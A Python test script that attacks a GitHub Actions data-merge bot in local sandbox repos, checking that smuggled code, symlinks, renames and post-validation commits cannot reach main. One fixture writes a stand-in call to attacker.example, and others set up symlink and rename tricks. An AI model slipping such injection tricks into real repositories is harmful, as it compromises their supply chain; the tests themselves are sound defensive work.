"""Exploit tests for apply-data-bot.yml, which pushes to main unattended.

Runs the workflow's own shell, cut out of the YAML, against throwaway local
repos and a stub `gh`. Nothing here touches the network.

Run: python3 scripts/test_data_bot_security.py
"""

import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS = {p.name: p.read_text() for p in (ROOT / ".github" / "workflows").glob("*.yml")}
BOT = WORKFLOWS["apply-data-bot.yml"]

# macOS ships bash 3.2, which has no mapfile.
MAPFILE = 'if ! type mapfile >/dev/null 2>&1; then mapfile(){ CHANGED=(); while IFS= read -r l; do CHANGED+=("$l"); done; }; fi\n'

failures = 0
checks = 0


def check(name, cond, detail=""):
    global failures, checks
    checks += 1
    if not cond:
        failures += 1
        print(f"  FAIL  {name}{('  -- ' + detail) if detail else ''}")
    else:
        print(f"  ok    {name}")


def step(name):
    """The `run: |` body of a named step."""
    lines = BOT.split(f"      - name: {name}", 1)[1].split("        run: |\n", 1)[1].split("\n")
    body = []
    for line in lines:
        if line.strip() and not line.startswith(" " * 10):
            break
        body.append(line[10:])
    return MAPFILE + "\n".join(body)


def git(cwd, *args, env=None):
    return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *args],
                          cwd=cwd, env=env, capture_output=True, text=True, check=True).stdout.strip()


class Sandbox:
    BRANCH = "price-sync/1-1"

    def __init__(self):
        self.box = Path(tempfile.mkdtemp())
        git(self.box, "init", "-q", "--bare", "-b", "main", "remote.git")
        git(self.box, "clone", "-q", str(self.box / "remote.git"), "work")
        self.work = self.box / "work"
        git(self.work, "checkout", "-q", "-B", "main")
        (self.work / "scripts").mkdir()
        shutil.copy(ROOT / "scripts" / "validate_data.py", self.work / "scripts")
        (self.work / "data").mkdir()
        self.write("companies", [{"ticker": f"T{i}", "revenue": 1e9, "market_cap": 1e9} for i in range(20)])
        self.write("deals", [{"target": "x"}])
        self.write("narratives", {"T1": {"about": "Makes pumps."}})
        self.write("news", {"T1": {"news": []}})
        self.write("dataset-meta", {"prices_as_of": "2026-11-19", "fundamentals_as_of": "2026-10-01",
                                    "universe_size": 20, "deal_count": 1})
        (self.work / "package.json").write_text('{"name": {"about": "site"}}')
        self.commit("seed")
        git(self.work, "push", "-q", "origin", "main")
        git(self.work, "checkout", "-q", "-b", self.BRANCH)

    def write(self, name, value):
        (self.work / "data" / f"{name}.json").write_text(json.dumps(value))

    def commit(self, message, age=0):
        git(self.work, "add", "-A")
        env = {**os.environ, "GIT_COMMITTER_DATE": f"@{int(time.time()) - age} +0000"}
        git(self.work, "commit", "-qm", message, env=env)

    def fresh_prices(self):
        self.write("dataset-meta", {"prices_as_of": "2026-11-20", "fundamentals_as_of": "2026-10-01",
                                    "universe_size": 20, "deal_count": 1})

    def push(self):
        git(self.work, "push", "-q", "origin", self.BRANCH)

    def stub_gh(self, body):
        bin_dir = self.box / "bin"
        bin_dir.mkdir(exist_ok=True)
        for name, text in (("gh", body), ("sleep", "exit 0\n")):
            (bin_dir / name).write_text("#!/bin/sh\n" + text)
            (bin_dir / name).chmod(0o755)

    def run(self, name, **env):
        # The workflow uses fixed /tmp paths, which are only right on a throwaway runner.
        script = step(name).replace("/tmp/", f"{self.box}/")
        output = self.box / "output"
        output.write_text("")
        full = {**os.environ, "PATH": f"{self.box / 'bin'}{os.pathsep}{os.environ['PATH']}",
                "GITHUB_OUTPUT": str(output), "BRANCH": self.BRANCH, "PYTHONDONTWRITEBYTECODE": "1", **env}
        result = subprocess.run(["bash", "-c", script], cwd=self.work, env=full, capture_output=True, text=True)
        result.outputs = dict(line.split("=", 1) for line in output.read_text().splitlines() if "=" in line)
        return result

    def remote(self, *args):
        return git(self.box, "--git-dir", str(self.box / "remote.git"), *args)


VERIFY = "Verify only allowed data files changed vs main"
MERGE = "Auto-merge as Ram VP (validated data only)"

print("=== Only plain data files get through ===")
s = Sandbox()
s.fresh_prices()
s.commit("good")
s.push()
r = s.run(VERIFY)
check("honest data passes", r.returncode == 0 and r.outputs.get("changed") == "true", r.stdout + r.stderr)

s = Sandbox()
(s.work / "evil.js").write_text("fetch('https://attacker.example')")
s.commit("code")
s.push()
check("code is blocked", s.run(VERIFY).returncode != 0)

s = Sandbox()
s.fresh_prices()
(s.work / "data" / "narratives.json").unlink()
(s.work / "data" / "narratives.json").symlink_to("../package.json")
s.commit("symlink")
s.push()
check("a symlink posing as data is blocked", s.run(VERIFY).returncode != 0)

s = Sandbox()
git(s.work, "mv", "package.json", "data/filter-bands.json")  # allowed name, absent on main
s.commit("rename")
s.push()
check("a rename can't delete code under cover of data", s.run(VERIFY).returncode != 0)

print("=== What merges is what was validated ===")
s = Sandbox()
s.fresh_prices()
s.commit("good")
s.push()
verified = s.run(VERIFY)
(s.work / "evil.js").write_text("// arrived after validation")
s.commit("swap")
s.push()
s.stub_gh(f'''case "$*" in
  *mergeable*) echo MERGEABLE;;
  *title*) echo Daily;;
  *headRefName*) echo {s.BRANCH};;
esac
''')
s.run(MERGE, PR="1", VALIDATED=verified.outputs.get("validated", ""))
check("a commit pushed after validation never reaches main",
      "evil.js" not in s.remote("ls-tree", "-r", "--name-only", "main"))
check("the validated data still merges", "2026-11-20" in s.remote("show", "main:data/dataset-meta.json"))

print("=== A stranger's fork PR can't delete a release ===")
s = Sandbox()
s.fresh_prices()
s.commit("good", age=3600)
s.push()
git(s.work, "checkout", "-q", "main")
fixture = s.box / "prs.json"
fixture.write_text(json.dumps([{"state": "CLOSED", "isCrossRepository": True}]))
s.stub_gh(f'''prog=
while [ $# -gt 0 ]; do [ "$1" = --jq ] && prog=$2; shift; done
[ -n "$prog" ] && jq -r "$prog" < '{fixture}'
''')
r = s.run("Pick branches to apply", EVENT="schedule", PUSHED="", REQUESTED="")
check("the real branch survives", s.BRANCH in s.remote("branch", "--format=%(refname:short)"), r.stdout)
check("and is still picked up", s.BRANCH in r.outputs.get("branches", ""), str(r.outputs))

print("=== Workflow hygiene ===")
for name, text in WORKFLOWS.items():
    uses = re.findall(r"uses:\s*(\S+)", text)
    check(f"{name}: actions are pinned to commits", all(re.search(r"@[0-9a-f]{40}$", u) for u in uses))
    check(f"{name}: no privileged PR trigger", "pull_request_target" not in text and "workflow_run:" not in text)
    check(f"{name}: declares its permissions", re.search(r"^permissions:", text, re.M) is not None)
tests = WORKFLOWS["tests.yml"]
check("tests run read-only", "contents: write" not in tests and "secrets." not in tests)
check("tests don't leave a token in .git",
      tests.count("persist-credentials: false") == tests.count("uses: actions/checkout"))

print(f"\n{checks - failures}/{checks} checks passed")
sys.exit(1 if failures else 0)
